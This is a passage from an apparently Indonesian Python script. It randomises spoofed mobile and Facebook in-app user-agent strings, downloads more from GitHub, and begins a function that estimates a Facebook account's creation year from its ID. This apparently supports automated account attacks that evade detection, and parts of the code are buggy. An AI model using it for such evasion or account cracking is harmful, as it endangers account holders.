    strvredmi = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(redmi))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvoppo1 = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(oppo))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvinfinix = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(infinix))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvsamsung = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(samsung))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvredmi1 = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(redmi))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
    strvnokiax = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
    strvgt = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
    strvinfinix = f"Mozilla/5.0 (Linux; Android {str(rc(andro))}; {str(rc(infinix))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    asep = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rc(iphone))}; like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))}/Mobile/15E148 Safari/604.1"
    gt = ['N4LEFH','TQ2A','QQ1B','PQ1A','SQ3A','RD1B','LDK2WU','SD2A','AB03E','Z367Q','R8638','C886H'] 
    strvgt = f"viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1,20))}; WOW64){str(rc(gt))})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Safari/537.36 Vivaldi/6.0.2979.18"
    u1 = f"Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 2 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android 9; Jazz 2 Build/P00610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/371.0.0.10.104;]"
    u3 = f"Mozilla/5.0 (Linux; Android 11; Vodafone Lite 4G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/372.0.0.15.104;]"
    u4 = f"Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Pro Build/PKQ1.181203.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.162 Mobile Safari/537.36"
    u5 = f"Mozilla/5.0 (Linux; Android 7.1.1; Redmi 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Mobile Safari/537.36"
    u6 = f"Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; OPPO PBBM30 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u7 = f"Mozilla/5.0 (Linux; Android 11; Infinix X688B Build/RP1A.200720.011;) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/93.0.4577.62 Seluler Safari/537.36"
    u8 = f"Mozilla/5.0 (Linux; Android 5.1; POLYTRON R2457 Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.106 Mobile Safari/537.36"
    u9 = f"Mozilla/5.0 (Linux; U; Android 12; vi-vn; CPH2407 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36"
    u10 = f"Mozilla/5.0 (Linux; Android 12; CPH2387) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36"
    u11 = f"Linux; Android 13; M2103K19I Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36"
    u12 = f"Linux; Android 10; TECNO KD6 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36"
    u13 = f"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/76.0.3809.132 Seluler Safari/537.36"
    u14 = f"Mozilla/5.0 (Linux; Android 6.0; S20+ Pro Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/44.0.2403.119 Mobile Safari/537.36"
    u15 = f"Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36"
    u16 = f"Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36"
    u17 = f"Mozilla/5.0 (Linux; Android 5.1; OPPO F1s Build/LMY47I) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36"
    u18 = f"Mozilla/5.0 (Linux; Android 11; CPH2239 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/110.0.5481.153 Seluler Safari/537.36"
    u19 = f"Mozilla/5.0 (Linux; Android 11; Infinix X665B Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/114.0.5735.196 Seluler Safari/537.36"
    u20 = f"Mozilla/5.0 (Linux; Android 11; CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/94.0.4606.71 Seluler Safari/537.36"
    u21 = f"Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A7600-F Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.3"
    u22 = f"Mozilla/5.0 (Linux; U; Android 10; Infinix X682B Build/QP1A.190711.020; wv) AppleWebKit/537.36"
    u23 = f"Mozilla/5.0 (Linux; Android 11; Mi 9 SE) AppleWebKit/537.36"
    u24 = f"Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
    u25 =f"Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
    u26 =f"Mozilla/5.0 (Linux; Android 9; PAHM00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36"
    u27 =f"Mozilla/5.0 (Linux; Android 9; PBDM00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36"
    u28 =f"Mozilla/5.0 (Linux; Android 9; PCAM00 Build/PKQ1.190101.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36 OPR/53.1.2569.142848"
    u29 =f"Mozilla/5.0 (Linux; Android 9; PCAT00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36"
    u30 =f"Mozilla/5.0 (Linux; Android 11; Lenovo L79031 Build/RKQ1.201022.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36"
    u31 =f"Mozilla/5.0 (Linux; Android 9; PCHM10 Build/PKQ1.190714.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 T7/11.17 SP-engine/2.13.0 baiduboxapp/11.17.0.13 (Baidu; P1 9)"
    u32 =f"Mozilla/5.0 (Linux; Android 11; 220233L2G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36"
    u33 =f"Mozilla/5.0 (Linux; Android 9; PCKM00 Build/PKQ1.190630.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36"
    u34 =f"Mozilla/5.0 (Linux; Android 9; PCLM10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36"
    u35 =f"Mozilla/5.0 (Linux; Android 9; PDBM00 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 T7/11.18 SP-engine/2.14.0 baiduboxapp/11.18.0.12 (Baidu; P1 9)"
    u36 =f"Mozilla/5.0 (Linux; Android 13; CPH2525 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.42 Chrome/116.0.0.0 Mobile Safari/537.36"
    u37 =f"Mozilla/5.0 (Linux; Android 11; CPH2493 Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.86.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/133.0.0.00.24;]"
    u38 =f"Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
    u39 =f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A415F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36"
    u40 =f"Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A37m Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u41 =f"Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; A31 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.114 Mobile Safari/537.36"
    u42 =f"Mozilla/5.0 (Linux; U; Android 5.1; en-gb; OPPO F1s Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u43 =f"Mozilla/5.0 (Linux; U; Android 8.1.0; vi-vn; OPPO R11s Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u44 =f"Mozilla/5.0 (Linux; U; Android 9; en-au; CPH1893 Build/PKQ1.190414.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u45 =f"Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; OPPO R7st Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u46 =f"Mozilla/5.0 (Linux; U; Android 9; in-id; CPH2071 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u47 =f"Mozilla/5.0 (Linux; U; Android 7.1.1; en-nz; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u48 =f"Mozilla/5.0 (Linux; U; Android 8.1.0; vi-vn; OPPO PBFT00 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u49 =f"Mozilla/5.0 (Linux; U; Android 9; CPH1937 Build/PKQ1.190714.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u50 =f"Mozilla/5.0 (Linux; U; Android 9; fr-fr; CPH1923 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u51 =f"Mozilla/5.0 (Linux; Android 8.1.0; PBCM30 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 Oppo57"
    u52 =f"Mozilla/5.0 (Linux; U; Android 5.1.1; gu-in; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 Oppo57"
    u53 =f"Mozilla/5.0 (Linux; U; Android 5.1; en-us; OPPO A37f Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 Oppocph"
    u54 =f"Mozilla/5.0 (Linux; U; Android 9; ar-eg; CPH1923 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 Oppo57"
    u55 =f"Mozilla/5.0 (Linux; U; Android 9; en-au; CPH2083 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 Oppo57"
    u56 =f"Mozilla/5.0 (Linux; U; Android 8.1.0; fr-fr; CPH1853 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 Oppo57"
    u57 =f"Mozilla/5.0 (Linux; U; Android 9; en-gb; CPH1893 Build/PKQ1.190414.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 Oppo57"
    u58 =f"Mozilla/5.0 (Linux; U; Android 9; hi-in; CPH2083 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 Oppo57"
    u59 =f"Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; PAAM00 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.60 Mobile Safari/537.36 Oppofacebooklite"
    u60 =f"Mozilla/5.0 (Linux; U; Android 7.1.1; ru-ru; OPPO R11t Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u61 =f"Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36"
    u62 =f"Mozilla/5.0 (Linux; U; Android 9; en-au; CPH2015 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u63 =f"Mozilla/5.0 (Linux; U; Android 9; en-gb; CPH1933 Build/PKQ1.190714.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u64 =f"Mozilla/5.0 (Linux; U; Android 9; th-th; CPH1823 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u65 =f"Mozilla/5.0 (Linux; U; Android 9; en-us; CPH1893 Build/PKQ1.190414.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u66 =f"Mozilla/5.0 (Linux; Android 11; moto g(20) Build/RTAS31.68-66-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]"
    u67 =f"Mozilla/5.0 (Linux; Android 10; SM-A105M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/431.0.0.30.108;]"
    u68 =f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 GLS/98.10.8539.40"
    u69 =f"Mozilla/5.0 (Linux; Android 13; Pixel 3 Build/TQ3A.230805.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36/gonative"
    u70 =f"Mozilla/5.0 (Linux; Android 10; SM-J600FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]"
    u71 =f"TuneIn Radio/26.3.0; iPhone8,1; iOS/15.7.8"
    u72 =f"Mozilla/5.0 (Linux; Android 13; Pixel 3 Build/TQ3A.230805.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36"
    u73 =f"Mozilla/5.0 (Linux; Android 13; 21081111RG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]"
    u74 =f"Mozilla/5.0 (Linux; Android 13; V2207 Build/TP1A.220624.014_IN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36"
    u75 =f"Mozilla/5.0 (Linux; U; Android 6.0.1; SM-G532G Build/MMB29T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36"
    u76 =f"Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00K Build/KVT49L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36"
    u77 =f"Mozilla/5.0 (Linux; Android 6.0; S5E_NXT Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36"
    u78 =f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
    u79 =f"Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"
    u80 =f"Mozilla/5.0 (Linux; Android 5.1; X9009 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/110.0.0.14.69; ]"
    u81 =f"Mozilla/5.0 (Linux; Android 5.1; XT1039 Build/LPBS23.13-17.6-1; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/ 112.0.0.17.70;]"
    u82 =f"Mozilla/5.0 (Linux; Android 5.1; A33w Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/120.0.0.14.84; ]"
    u83 =f"Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/123.0.0.11.70; ]"
    u84 =f"Mozilla/5.0 (Linux; Android 4.4.2; 1201 Build/KOT49H) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/128.0.0.21.88; ]"
    u85 =f"Mozilla/5.0 (Linux; Android 4.4.2; LG-F460K Build/KOT49I.F460K11e) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/125.0. 0.22.70;]"
    u86 =f"Mozilla/5.0 (Linux; Android 5.1.1; F1w Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/126.0.0.9. 84;]"
    u87 =f"Mozilla/5.0 (Linux; Android 5.1; N9518 Build/LMY47O; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/105.0.0.16.69; ]"
    u88 =f"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 seperti Mac OS X) AppleWebKit/605.1.15 (KHTML, seperti Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    u89 =f"Mozilla/5.0 (Linux; Android 13; M2012K11AG Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36"
    u90 =f"Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5514D) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36"
    u91 =f"Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu M10 Build/MRA58K) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/57.0.2987.108 MZBrowser/7.99.141-2019091915 UWS/2.15 .0.4 Safari Seluler/537.36"
    u92 =f"Mozilla/5.0 (Linux; Android 11; SM-A405FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36"
    u93 =f"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J120H) AppleWebKit/537.36 (KHTML, seperti Gecko) SamsungBrowser/11.2 Chrome/75.0.3770.143 Mobile Safari/537.36"
    ua1 =f"UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; en-US; SM-G610F Build/NRD90M) U2/1.0.0 UCMini/10.9.0.946 (SpeedMode; Android 7.0; SM-G610F Build/NRD90M ) Ponsel"
    ua2 =f"UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; en-US; SM-J400F Build/R16NW) U2/1.0.0 UCMini/10.9.0.946 (Mode Kecepatan; Android 8.0.0; SM-J400F Build /R16NW) Seluler"
    ua3=f"Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profil/Konfigurasi MIDP-2.1/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, seperti Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4"
    uateddy = random.choice([strvoppo, strvredmi,strvoppo1, strvinfinix, strvsamsung, strvredmi1, strvnokiax, strvgt,asep,gt,strvgt,u1, u2, u3, u4, u5, u6, u7, u8, u9, u10, u11, u12, u13, u14, u15, u16, u17, u18, u19, u20, u21, u22, u23, u24, u25, u26, u27, u28, u29, u30, u31, u32, u33, u34, u35, u36, u37, u38, u39, u40, u41, u42, u43, u44, u45, u46, u47, u48, u49, u50, u51, u52, u53, u54, u55, u56, u57, u58, u59, u60, u61, u62, u63, u64, u65, u66, u67, u68, u69, u70, u71, u72, u73, u74, u75, u76, u77, u78,u79,u80,u81,u82,u83, u84, u85, u86, u87, u88, u89, u90, u91, u92, u93])
    ugen.append(uateddy)
    
#--------[ GENERATE-USER-AGENT ]----------#
for generate in range(10):
	a=random.randrange(1, 9)
	b=random.randrange(1, 9)
	c=random.randrange(7, 13)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}.{b}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
ua = random.choice(["Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 10; SM-A700S Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Oneplus A99831 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.03.54;]","Mozilla/5.0 (Linux; Android 11; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; 22041219I Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.02.33;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]"])
ua =random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS {str(rc(iphone))}; like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))}/Mobile/15E148 Safari/604.1"])

#--------[ TAHUN-AKUN ]--------#    
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
